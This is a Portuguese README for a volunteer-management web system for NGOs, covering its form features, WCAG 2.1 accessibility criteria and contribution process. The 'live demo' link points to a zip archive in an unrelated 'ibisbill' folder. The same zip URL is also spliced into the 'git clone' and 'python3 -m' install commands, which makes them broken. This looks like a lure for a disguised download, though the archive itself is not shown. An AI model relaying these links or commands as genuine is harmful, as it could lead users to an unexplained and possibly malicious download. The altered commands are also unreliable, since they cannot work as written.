Sistema web completo e profissional para cadastro e gestão de voluntários em organizações não governamentais. Desenvolvido com foco em acessibilidade, performance e experiência do usuário, seguindo as melhores práticas de desenvolvimento front-end.

## 🌐 Demonstração Online

🔗 **[Acesse a demonstração ao vivo](https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip)**

### 🚀 Instalação Rápida

```bash
# Clone o repositório
git clone https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip

# Entre no diretório
cd sistema-voluntarios

# Inicie um servidor local
python3 -m https://raw.githubusercontent.com/DarlanCavalcante/sistema-voluntarios/main/ibisbill/sistema-voluntarios.zip 8080

# Acesse http://localhost:8080
```

### 📋 Pré-requisitos

- Navegador moderno (Chrome 90+, Firefox 88+, Safari 14+, Edge 90+)
- Python 3.x (para servidor local) ou qualquer servidor web
- Conexão com internet (para API ViaCEP e fontes)

## 🚀 Funcionalidades Implementadas

### ✅ Estrutura HTML5 Semântica Completa
- Tags semânticas (`<header>`, `<nav>`, `<main>`, `<section>`, `<footer>`)
- Hierarquia de títulos lógica e consistente
- Uso adequado de imagens em todas as páginas
- 3+ páginas HTML organizadas

### ✅ Formulários Complexos e Interativos
- **Campos HTML5 implementados:**
  - Nome Completo (text + pattern)
  - E-mail (email)
  - CPF (text + máscara + validação)
  - Telefone (tel + máscara)
  - Data de Nascimento (date + limites)
  - Endereço completo (text)
  - CEP (text + máscara + API ViaCEP)
  - Cidade e Estado (text + select)

- **Validação HTML5 nativa:**
  - `required`, `pattern`, `minlength`, `maxlength`
  - `min`, `max`, `type`, `title`
  - Mensagens de erro personalizadas em português

- **Agrupamento lógico com fieldsets:**
  - Dados Pessoais
  - Informações de Contato
  - Endereço
  - Informações de Voluntariado
  - Confirmação

- **Máscaras de input:**
  - CPF: `000.000.000-00`
  - Telefone: `(00) 00000-0000`
  - CEP: `00000-000`

## ♿ Conformidade com Acessibilidade

Este projeto atende às diretrizes **WCAG 2.1 Nível AA**:

### ✅ Critérios Implementados
- **1.1.1** - Conteúdo não textual tem alternativas
- **1.3.1** - Informações e relacionamentos preservados
- **1.4.3** - Contraste mínimo 4.5:1 garantido
- **1.4.6** - Contraste aprimorado 7:1 em modo alto contraste
- **2.1.1** - Navegação completa por teclado
- **2.1.2** - Sem armadilhas de foco
- **2.4.1** - Skip links implementados
- **2.4.3** - Ordem de foco lógica
- **3.1.1** - Idioma da página definido
- **4.1.2** - Nome, função e valor expostos via API

## 🤝 Contribuindo

Contribuições são bem-vindas! Este projeto segue o padrão GitFlow e Conventional Commits.

### 📋 Processo de Contribuição

1. **Fork** o repositório
2. **Clone** seu fork localmente
3. **Crie uma branch** seguindo o padrão:
   ```bash
   git checkout -b feature/nova-funcionalidade
   git checkout -b fix/correcao-bug
   git checkout -b docs/atualizar-readme
   ```
4. **Desenvolva** seguindo os padrões do projeto
5. **Teste** em múltiplos navegadores e dispositivos
6. **Commit** com mensagens semânticas:
   ```bash
   git commit -m "feat: adicionar nova funcionalidade X"
   git commit -m "fix: corrigir problema Y no formulário"
   git commit -m "docs: atualizar documentação Z"
   ```
7. **Push** para seu fork
8. **Abra um Pull Request** detalhado

### � Padrões de Código

- **HTML**: Semântico, acessível, validado
- **CSS**: BEM methodology, mobile-first
- **JavaScript**: ES6+, modulares, documentados
- **Commits**: Conventional Commits specification
- **Branches**: GitFlow (main, develop, feature/*, hotfix/*)

### 🧪 Testes

Antes de enviar um PR, teste:
- ✅ Navegação por teclado
- ✅ Leitores de tela (NVDA, JAWS, VoiceOver)
- ✅ Dispositivos móveis
- ✅ Diferentes navegadores
- ✅ Modo escuro/alto contraste
